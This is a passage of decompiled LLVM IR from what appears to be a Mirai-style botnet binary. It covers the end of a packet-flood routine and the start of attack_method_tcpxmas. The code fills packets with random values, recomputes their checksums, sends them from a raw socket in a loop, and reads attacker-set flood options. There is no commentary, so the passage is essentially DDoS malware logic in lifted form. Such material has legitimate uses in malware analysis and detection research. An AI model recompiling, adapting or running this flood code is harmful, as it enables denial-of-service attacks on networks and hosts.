  %v0_a9b4 = phi i32 [ %v0_a9b4.pre, %dec_label_pc_a9b0.preheader ], [ 0, %dec_label_pc_aaa8 ], [ 0, %dec_label_pc_a9b0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a9b4 = icmp eq i32 %v0_a9b4, 0
  store i1 %v2_a9b4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a9b4, label %dec_label_pc_a9b0, label %dec_label_pc_a9c0

dec_label_pc_a9c0:                                ; preds = %dec_label_pc_a9b0, %dec_label_pc_aaa8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_a9c4 = load i32, i32* @r7, align 4
  %v1_a9c4 = add i32 %v0_a9c4, 27
  store i32 %v1_a9c4, i32* @sb, align 4
  %v1_a9c8 = add i32 %v0_a9c4, 47
  store i32 %v1_a9c8, i32* @sl, align 4
  br label %dec_label_pc_a9cc

dec_label_pc_a9cc:                                ; preds = %dec_label_pc_aa10, %dec_label_pc_a9c0
  %v1_a9d8 = phi i32 [ %v1_aa98, %dec_label_pc_aa10 ], [ 0, %dec_label_pc_a9c0 ]
  store i32 %v2_a4e0, i32* %r3.global-to-local, align 4
  store i32 %v3_a784, i32* %ip.global-to-local, align 4
  %v4_a9d8 = mul i32 %v1_a9d8, 4
  %v5_a9d8 = add i32 %v4_a9d8, %v2_a4e0
  %v6_a9d8 = inttoptr i32 %v5_a9d8 to i32*
  %v7_a9d8 = load i32, i32* %v6_a9d8, align 4
  store i32 %v7_a9d8, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_a9e0, i1* %cpsr_z.global-to-local, align 1
  %v1_a9e4 = add i32 %v7_a9d8, 20
  store i32 %v1_a9e4, i32* @r6, align 4
  br i1 %v3_a9e0, label %dec_label_pc_aabc, label %dec_label_pc_a9ec

dec_label_pc_a9ec:                                ; preds = %dec_label_pc_a9cc
  store i32 %v3_a78c, i32* @lr, align 4
  store i1 %v3_a9f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a9f0, label %dec_label_pc_aad0, label %dec_label_pc_a9f8

dec_label_pc_a9f8:                                ; preds = %dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge, %dec_label_pc_a9ec
  %v1_a9fc = phi i32 [ %v1_a9fc.pre, %dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge ], [ 65535, %dec_label_pc_a9ec ]
  store i32 %v3_a7a8, i32* %r0.global-to-local, align 4
  %v9_a9fc = icmp eq i32 %v3_a7a8, %v1_a9fc
  store i1 %v9_a9fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a9fc, label %dec_label_pc_aae4, label %dec_label_pc_aa04

dec_label_pc_aa04:                                ; preds = %dec_label_pc_aad0, %dec_label_pc_a9f8
  %v1_aa08 = phi i32 [ %v1_aadc, %dec_label_pc_aad0 ], [ %v1_a9fc, %dec_label_pc_a9f8 ]
  store i32 %v3_a7b0, i32* %r2.global-to-local, align 4
  %v9_aa08 = icmp eq i32 %v3_a7b0, %v1_aa08
  store i1 %v9_aa08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa08, label %dec_label_pc_aaf8, label %dec_label_pc_aa10

dec_label_pc_aa10:                                ; preds = %dec_label_pc_aae4, %dec_label_pc_aa04, %dec_label_pc_aaf8
  %v0_aa10 = load i32, i32* @r4, align 4
  %v1_aa10 = add i32 %v0_aa10, 41
  store i32 %v1_aa10, i32* %r0.global-to-local, align 4
  store i32 %v4_aa14.pre-phi, i32* %r1.global-to-local, align 4
  %v2_aa18 = call i32 @rand_alpha_str(i32 %v1_aa10, i32 %v4_aa14.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_aa20 = load i32, i32* @r4, align 4
  %v3_aa20 = add i32 %v2_aa20, 10
  %v4_aa20 = inttoptr i32 %v3_aa20 to i16*
  store i16 0, i16* %v4_aa20, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_aa28 = load i32, i32* @r4, align 4
  store i32 %v0_aa28, i32* @r0, align 4
  %v2_aa2c = call i32 @checksum_generic(i32 %v0_aa28, i32 20)
  %v3_aa2c = trunc i32 %v2_aa2c to i16
  store i32 %v2_aa2c, i32* %r0.global-to-local, align 4
  %v3_aa30 = load i32, i32* @r4, align 4
  %v4_aa30 = add i32 %v3_aa30, 10
  %v5_aa30 = inttoptr i32 %v4_aa30 to i16*
  store i16 %v3_aa2c, i16* %v5_aa30, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_aa38 = load i32, i32* @r6, align 4
  %v3_aa38 = add i32 %v2_aa38, 6
  %v4_aa38 = inttoptr i32 %v3_aa38 to i16*
  store i16 0, i16* %v4_aa38, align 2
  %v0_aa3c = load i32, i32* @r6, align 4
  store i32 %v0_aa3c, i32* @r1, align 4
  %v1_aa40 = add i32 %v0_aa3c, 4
  %v2_aa40 = inttoptr i32 %v1_aa40 to i16*
  %v3_aa40 = load i16, i16* %v2_aa40, align 2
  %v4_aa40 = zext i16 %v3_aa40 to i32
  store i32 %v4_aa40, i32* %r2.global-to-local, align 4
  %v0_aa44 = load i32, i32* @sb, align 4
  store i32 %v0_aa44, i32* %r3.global-to-local, align 4
  %v0_aa48 = load i32, i32* @r4, align 4
  store i32 %v0_aa48, i32* %r0.global-to-local, align 4
  %v4_aa4c = call i32 @checksum_tcpudp(i32 %v0_aa48, i32 %v0_aa3c, i32 %v4_aa40, i32 %v0_aa44)
  %v5_aa4c = trunc i32 %v4_aa4c to i16
  store i32 %v4_aa4c, i32* %r0.global-to-local, align 4
  %v3_aa50 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa50, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_aa58 = mul i32 %v3_aa50, 32
  store i32 %v3_aa58, i32* %ip.global-to-local, align 4
  %v3_aa5c = load i32, i32* @r6, align 4
  %v4_aa5c = add i32 %v3_aa5c, 6
  %v5_aa5c = inttoptr i32 %v4_aa5c to i16*
  store i16 %v5_aa4c, i16* %v5_aa5c, align 2
  %v0_aa60 = load i32, i32* %ip.global-to-local, align 4
  %v1_aa60 = load i32, i32* %r3.global-to-local, align 4
  %tmp128 = mul i32 %v1_aa60, -8
  %v5_aa60 = add i32 %v0_aa60, %tmp128
  store i32 %v5_aa60, i32* %ip.global-to-local, align 4
  %v0_aa64 = load i32, i32* @r6, align 4
  %v1_aa64 = add i32 %v0_aa64, 2
  %v2_aa64 = inttoptr i32 %v1_aa64 to i16*
  %v3_aa64 = load i16, i16* %v2_aa64, align 2
  %v4_aa64 = zext i16 %v3_aa64 to i32
  store i32 %v4_aa64, i32* @r6, align 4
  %v1_aa68 = load i32, i32* @lr, align 4
  %v2_aa68 = add i32 %v1_aa68, %v5_aa60
  store i32 %v2_aa68, i32* %ip.global-to-local, align 4
  %v3_aa6c = add i32 %v2_aa68, 2
  %v4_aa6c = inttoptr i32 %v3_aa6c to i16*
  store i16 %v3_aa64, i16* %v4_aa6c, align 2
  %v0_aa70 = load i32, i32* @fp, align 4
  %v1_aa70 = load i32, i32* %ip.global-to-local, align 4
  %v2_aa70 = add i32 %v1_aa70, 4
  %v3_aa70 = inttoptr i32 %v2_aa70 to i32*
  store i32 %v0_aa70, i32* %v3_aa70, align 4
  %v0_aa74 = load i32, i32* @r4, align 4
  store i32 %v0_aa74, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  %v0_aa80 = load i32, i32* @sl, align 4
  store i32 %v0_aa80, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_aa88 = load i32, i32* %ip.global-to-local, align 4
  %v6_aa90 = call i32 @__libc_sendto(i32 %v3_a728, i32 %v0_aa74, i32 %v0_aa80, i32 16384, i32 %v0_aa88, i32 16)
  %v3_aa94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa94, i32* %r3.global-to-local, align 4
  %v1_aa98 = add i32 %v3_aa94, 1
  store i32 %v1_aa98, i32* %r0.global-to-local, align 4
  %v0_aa9c = load i32, i32* @r8, align 4
  %v9_aa9c = icmp eq i32 %v0_aa9c, %v1_aa98
  store i1 %v9_aa9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_aa98, i32* %stack_var_-44, align 4
  %v8_aaa4 = icmp sgt i32 %v0_aa9c, %v1_aa98
  br i1 %v8_aaa4, label %dec_label_pc_a9cc, label %dec_label_pc_aaa8

dec_label_pc_aaa8:                                ; preds = %dec_label_pc_aa10
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_aaac = icmp eq i32 %v0_aa9c, 0
  store i1 %v2_aaac, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_aaac, label %dec_label_pc_a9b0, label %dec_label_pc_a9c0

dec_label_pc_aabc:                                ; preds = %dec_label_pc_a9cc
  %v0_aabc = call i32 @rand_next()
  %v1_aabc = trunc i32 %v0_aabc to i16
  store i32 %v0_aabc, i32* %r0.global-to-local, align 4
  store i32 %v3_a78c, i32* @lr, align 4
  %v1_aac4 = load i32, i32* @r5, align 4
  %v9_aac4 = icmp eq i32 %v3_a78c, %v1_aac4
  store i1 %v9_aac4, i1* %cpsr_z.global-to-local, align 1
  %v3_aac8 = load i32, i32* @r4, align 4
  %v4_aac8 = add i32 %v3_aac8, 4
  %v5_aac8 = inttoptr i32 %v4_aac8 to i16*
  store i16 %v1_aabc, i16* %v5_aac8, align 2
  br i1 %v9_aac4, label %dec_label_pc_aad0, label %dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge

dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge:    ; preds = %dec_label_pc_aabc
  %v1_a9fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a9f8

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aabc, %dec_label_pc_a9ec
  %v0_aad0 = call i32 @rand_next()
  %v1_aad0 = trunc i32 %v0_aad0 to i16
  %v3_aad4 = load i32, i32* @r4, align 4
  %v4_aad4 = add i32 %v3_aad4, 20
  %v5_aad4 = inttoptr i32 %v4_aad4 to i16*
  store i16 %v1_aad0, i16* %v5_aad4, align 2
  store i32 %v3_a7a8, i32* %r0.global-to-local, align 4
  %v1_aadc = load i32, i32* @r5, align 4
  %v9_aadc = icmp eq i32 %v3_a7a8, %v1_aadc
  store i1 %v9_aadc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aadc, label %dec_label_pc_aae4, label %dec_label_pc_aa04

dec_label_pc_aae4:                                ; preds = %dec_label_pc_aad0, %dec_label_pc_a9f8
  %v0_aae4 = call i32 @rand_next()
  %v1_aae4 = trunc i32 %v0_aae4 to i16
  store i32 %v0_aae4, i32* %r0.global-to-local, align 4
  store i32 %v3_a7b0, i32* %r2.global-to-local, align 4
  %v1_aaec = load i32, i32* @r5, align 4
  %v9_aaec = icmp eq i32 %v3_a7b0, %v1_aaec
  store i1 %v9_aaec, i1* %cpsr_z.global-to-local, align 1
  %v3_aaf0 = load i32, i32* @r6, align 4
  %v4_aaf0 = add i32 %v3_aaf0, 2
  %v5_aaf0 = inttoptr i32 %v4_aaf0 to i16*
  store i16 %v1_aae4, i16* %v5_aaf0, align 2
  br i1 %v9_aaec, label %dec_label_pc_aaf8, label %dec_label_pc_aa10

dec_label_pc_aaf8:                                ; preds = %dec_label_pc_aae4, %dec_label_pc_aa04
  %v0_aaf8 = call i32 @rand_next()
  %v1_aaf8 = trunc i32 %v0_aaf8 to i16
  store i32 %v0_aaf8, i32* %r0.global-to-local, align 4
  %v3_aafc = load i32, i32* @r4, align 4
  %v4_aafc = add i32 %v3_aafc, 28
  %v5_aafc = inttoptr i32 %v4_aafc to i16*
  store i16 %v1_aaf8, i16* %v5_aafc, align 2
  br label %dec_label_pc_aa10

dec_label_pc_ab04:                                ; preds = %dec_label_pc_a690, %dec_label_pc_a670, %dec_label_pc_a614, %entry
  %v0_ab04 = call i32 @rand_next()
  %v1_ab08 = urem i32 %v0_ab04, 4
  store i32 %v1_ab08, i32* %r0.global-to-local, align 4
  %v2_ab0c = icmp eq i32 %v1_ab08, 3
  store i1 %v2_ab0c, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_ab04 to i2
  switch i2 %trunc, label %dec_label_pc_a70811 [
    i2 0, label %dec_label_pc_ab40
    i2 1, label %dec_label_pc_ab6c
    i2 -2, label %dec_label_pc_ab60
    i2 -1, label %dec_label_pc_ab50
  ]

dec_label_pc_ab28:                                ; preds = %dec_label_pc_a738
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  %v1_ab2c = call i32 @__GI___libc_close(i32 %v3_a728)
  store i32 %v1_ab2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ab30

dec_label_pc_ab30:                                ; preds = %dec_label_pc_a710, %dec_label_pc_a708, %dec_label_pc_ab28
  %v1_ab3c = phi i32 [ %v3_a728, %dec_label_pc_a710 ], [ %v1_ab3c49, %dec_label_pc_a708 ], [ %v1_ab2c, %dec_label_pc_ab28 ]
  store i32 %v18_a4c0, i32* %sb.global-to-local, align 4
  store i32 %v27_a4c0, i32* %lr.global-to-local, align 4
  ret i32 %v1_ab3c

dec_label_pc_ab40:                                ; preds = %dec_label_pc_ab04
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_ab50:                                ; preds = %dec_label_pc_ab04
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_ab60:                                ; preds = %dec_label_pc_ab04
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_ab6c:                                ; preds = %dec_label_pc_ab04
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_a708

; uselistorder directives
  uselistorder i32 %v1_ab08, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_ab04, { 1, 0 }
  uselistorder i32 %v0_aaf8, { 1, 0 }
  uselistorder i32 %v0_aae4, { 1, 0 }
  uselistorder i32 %v1_aadc, { 1, 0 }
  uselistorder i32 %v0_aabc, { 1, 0 }
  uselistorder i32 %v1_aa98, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_aa60, { 1, 0 }
  uselistorder i32 %v4_aa4c, { 1, 0 }
  uselistorder i32 %v2_aa2c, { 1, 0 }
  uselistorder i1 %v3_a9f0, { 1, 0 }
  uselistorder i1 %v3_a9e0, { 1, 0 }
  uselistorder i32 %v4_aa14.pre-phi, { 1, 0 }
  uselistorder i32 %v1_a988, { 1, 0, 2 }
  uselistorder i32 %v0_a978, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_a964, { 2, 0, 3, 1 }
  uselistorder i32 %v0_a960, { 1, 0, 2 }
  uselistorder i32 %v0_a8d0, { 1, 0 }
  uselistorder i32 %v4_a8cc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp111, { 1, 0 }
  uselistorder i32 %v3_a818, { 1, 0 }
  uselistorder i32 %v3_a7d4, { 1, 0 }
  uselistorder i32 %v1_a7c8, { 2, 0, 1 }
  uselistorder i32 %v3_a794, { 1, 0 }
  uselistorder i32 %v3_a78c, { 1, 2, 3, 5, 0, 4 }
  uselistorder i32 %v3_a784, { 0, 2, 1 }
  uselistorder i8 %v5_a77c, { 1, 0, 2 }
  uselistorder i32 %v1_a768, { 1, 0 }
  uselistorder i32 %v0_a768, { 1, 0 }
  uselistorder i1 %v7_a758, { 1, 0 }
  uselistorder i1 %v7_a72c, { 1, 0 }
  uselistorder i32 %v3_a728, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_a708, { 1, 0, 2 }
  uselistorder i32 %v2_a6d8, { 0, 1, 3, 2 }
  uselistorder i32 %v2_a6d4, { 1, 0, 2 }
  uselistorder i1 %v7_a6c4, { 1, 0 }
  uselistorder i32 %v1_a6c0, { 1, 0, 2 }
  uselistorder i1 %v8_a6b8, { 1, 0 }
  uselistorder i1 %v7_a6b4, { 1, 0 }
  uselistorder i32 %v1_a6a8, { 1, 0 }
  uselistorder i8 %v2_a69c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_a6a0, { 1, 0 }
  uselistorder i32 %v0_a6c0, { 3, 0, 2, 1 }
  uselistorder i32 %v0_a690, { 0, 2, 1 }
  uselistorder i32 %v1_a6a4, { 0, 2, 1 }
  uselistorder i32 %v2_a678, { 1, 0, 2, 3 }
  uselistorder i32 %v0_a670, { 1, 0, 2, 3 }
  uselistorder i1 %v7_a668, { 1, 0 }
  uselistorder i32 %v0_a668, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_a60c, { 1, 0, 3, 2 }
  uselistorder i32 %v6_a5ac, { 1, 0, 2, 3 }
  uselistorder i32 %v6_a590, { 1, 0, 2, 3 }
  uselistorder i32 %v6_a578, { 2, 1, 0 }
  uselistorder i32 %v1_a560, { 1, 0 }
  uselistorder i32 %v7_a51c, { 1, 0, 2 }
  uselistorder i32 %v2_a4e0, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %sb.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 15, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 7, 6, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 5, 6, 7, 9, 8, 11, 10, 12, 14, 13, 16, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 6, 5, 8, 7, 9, 11, 10, 12, 13, 14, 30, 29, 32, 31, 33, 34, 35, 40, 36, 37, 38, 39, 44, 41, 42, 43, 45, 47, 46, 48, 49, 50, 51, 53, 52, 54, 55, 57, 56, 58, 16, 15, 18, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 10, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 7, 8, 9 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 26, 27, 28, 25, 22, 29, 30, 31 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ab30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aa10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a9c0, { 1, 0 }
  uselistorder label %dec_label_pc_a9b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a9b0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_a980, { 1, 0 }
  uselistorder label %.thread20, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %dec_label_pc_a6d0, { 1, 0 }
  uselistorder label %dec_label_pc_a6c4, { 1, 0 }
  uselistorder label %dec_label_pc_a690, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a688, { 1, 0 }
}

define i32 @attack_method_tcpxmas(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_ab7c = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_ab98 = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_aba4 = load i32, i32* @r6, align 4
  store i32 %v0_aba4, i32* %r0.global-to-local, align 4
  %v2_aba8 = call i32 @calloc(i32 %v0_aba4, i32 4)
  %v0_abac = load i32, i32* @r5, align 4
  store i32 %v0_abac, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_abbc = load i32, i32* @r4, align 4
  store i32 %v0_abbc, i32* %r0.global-to-local, align 4
  %v5_abc0 = inttoptr i32 %v0_abac to i32*
  %v6_abc0 = call i32 @attack_get_opt_int(i32 %v0_abbc, i32* %v5_abc0, i32 2, i32 0)
  %v1_abcc = urem i32 %v6_abc0, 256
  store i32 %v1_abcc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_abd8 = load i32, i32* @r5, align 4
  store i32 %v0_abd8, i32* %r1.global-to-local, align 4
  %v0_abdc = load i32, i32* @r4, align 4
  store i32 %v0_abdc, i32* %r0.global-to-local, align 4
  %v5_abe0 = trunc i32 %v6_abc0 to i8
  %v6_abe4 = inttoptr i32 %v0_abd8 to i32*
  %v7_abe4 = call i32 @attack_get_opt_int(i32 %v0_abdc, i32* %v6_abe4, i32 3, i32 65535)
  %v0_abe8 = load i32, i32* @r5, align 4
  store i32 %v0_abe8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_abe4, i32* @r7, align 4
  %v0_abf8 = load i32, i32* @r4, align 4
  store i32 %v0_abf8, i32* %r0.global-to-local, align 4
  %v4_abfc = inttoptr i32 %v0_abe8 to i32*
  %v5_abfc = call i32 @attack_get_opt_int(i32 %v0_abf8, i32* %v4_abfc, i32 4, i32 64)
  %v1_ac04 = urem i32 %v5_abfc, 256
  store i32 %v1_ac04, i32* %ip.global-to-local, align 4
  %v0_ac08 = load i32, i32* @r5, align 4
  store i32 %v0_ac08, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac14 = load i32, i32* @r4, align 4
  store i32 %v0_ac14, i32* %r0.global-to-local, align 4
  %v6_ac1c = inttoptr i32 %v0_ac08 to i32*
  %v7_ac1c = call i32 @attack_get_opt_int(i32 %v0_ac14, i32* %v6_ac1c, i32 5, i32 1)
  %v1_ac28 = urem i32 %v7_ac1c, 256
  store i32 %v1_ac28, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_ac30 = load i32, i32* @r5, align 4
  store i32 %v0_ac30, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_ac38 = load i32, i32* @r4, align 4
  store i32 %v0_ac38, i32* %r0.global-to-local, align 4
  %v5_ac40 = inttoptr i32 %v0_ac30 to i32*
  %v6_ac40 = call i32 @attack_get_opt_int(i32 %v0_ac38, i32* %v5_ac40, i32 7, i32 65535)
  %v0_ac44 = load i32, i32* @r5, align 4
  store i32 %v0_ac44, i32* %r1.global-to-local, align 4
  %v3_ac48 = mul i32 %v6_ac40, 65536
  store i32 %v3_ac48, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac54 = load i32, i32* @r4, align 4
  store i32 %v0_ac54, i32* %r0.global-to-local, align 4
  %v3_ac58 = urem i32 %v6_ac40, 65536
  store i32 %v3_ac58, i32* @sl, align 4
  %v4_ac5c = inttoptr i32 %v0_ac44 to i32*
  %v5_ac5c = call i32 @attack_get_opt_int(i32 %v0_ac54, i32* %v4_ac5c, i32 11, i32 1)
  %v1_ac64 = urem i32 %v5_ac5c, 256
  store i32 %v1_ac64, i32* %ip.global-to-local, align 4
  %v0_ac68 = load i32, i32* @r5, align 4
  store i32 %v0_ac68, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac74 = load i32, i32* @r4, align 4
  store i32 %v0_ac74, i32* %r0.global-to-local, align 4
  %v5_ac7c = inttoptr i32 %v0_ac68 to i32*
  %v6_ac7c = call i32 @attack_get_opt_int(i32 %v0_ac74, i32* %v5_ac7c, i32 12, i32 1)
  %v1_ac84 = urem i32 %v6_ac7c, 256
  store i32 %v1_ac84, i32* %ip.global-to-local, align 4
  %v0_ac88 = load i32, i32* @r5, align 4
  store i32 %v0_ac88, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac94 = load i32, i32* @r4, align 4
  store i32 %v0_ac94, i32* %r0.global-to-local, align 4
  %v5_ac9c = inttoptr i32 %v0_ac88 to i32*
  %v6_ac9c = call i32 @attack_get_opt_int(i32 %v0_ac94, i32* %v5_ac9c, i32 13, i32 1)
  %v1_aca4 = urem i32 %v6_ac9c, 256
  store i32 %v1_aca4, i32* %ip.global-to-local, align 4
  %v0_aca8 = load i32, i32* @r5, align 4
  store i32 %v0_aca8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acb4 = load i32, i32* @r4, align 4
  store i32 %v0_acb4, i32* %r0.global-to-local, align 4
  %v5_acbc = inttoptr i32 %v0_aca8 to i32*
  %v6_acbc = call i32 @attack_get_opt_int(i32 %v0_acb4, i32* %v5_acbc, i32 14, i32 1)
  %v1_acc4 = urem i32 %v6_acbc, 256
  store i32 %v1_acc4, i32* %ip.global-to-local, align 4
  %v0_acc8 = load i32, i32* @r5, align 4
  store i32 %v0_acc8, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acd4 = load i32, i32* @r4, align 4
  store i32 %v0_acd4, i32* %r0.global-to-local, align 4
  %v5_acdc = inttoptr i32 %v0_acc8 to i32*
  %v6_acdc = call i32 @attack_get_opt_int(i32 %v0_acd4, i32* %v5_acdc, i32 15, i32 1)
  %v1_ace4 = urem i32 %v6_acdc, 256
  store i32 %v1_ace4, i32* %ip.global-to-local, align 4
  %v0_ace8 = load i32, i32* @r5, align 4
  store i32 %v0_ace8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acf4 = load i32, i32* @r4, align 4
  store i32 %v0_acf4, i32* %r0.global-to-local, align 4
  %v5_acfc = inttoptr i32 %v0_ace8 to i32*
  %v6_acfc = call i32 @attack_get_opt_int(i32 %v0_acf4, i32* %v5_acfc, i32 16, i32 1)
  %v1_ad04 = urem i32 %v6_acfc, 256
  store i32 %v1_ad04, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_ad10 = load i32, i32* @r5, align 4
  store i32 %v0_ad10, i32* %r1.global-to-local, align 4
  %v0_ad14 = load i32, i32* @r4, align 4
  store i32 %v0_ad14, i32* %r0.global-to-local, align 4
  %v5_ad1c = inttoptr i32 %v0_ad10 to i32*
  %v6_ad1c = call i32 @attack_get_opt_int(i32 %v0_ad14, i32* %v5_ad1c, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ad2c = load i32, i32* @r5, align 4
  store i32 %v0_ad2c, i32* %r1.global-to-local, align 4
  %v0_ad30 = load i32, i32* @r4, align 4
  store i32 %v0_ad30, i32* %r0.global-to-local, align 4
  %v4_ad34 = inttoptr i32 %v0_ad2c to i32*
  %v5_ad34 = call i32 @attack_get_opt_int(i32 %v0_ad30, i32* %v4_ad34, i32 1, i32 1)
  %v1_ad3c = urem i32 %v5_ad34, 256
  store i32 %v1_ad3c, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_ad50 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_ad50, i32* %r0.global-to-local, align 4
  %v7_ad54 = icmp eq i32 %v3_ad50, -1
  store i1 %v7_ad54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_ad50, i32* @sb, align 4
  br i1 %v7_ad54, label %dec_label_pc_af44, label %dec_label_pc_ad60

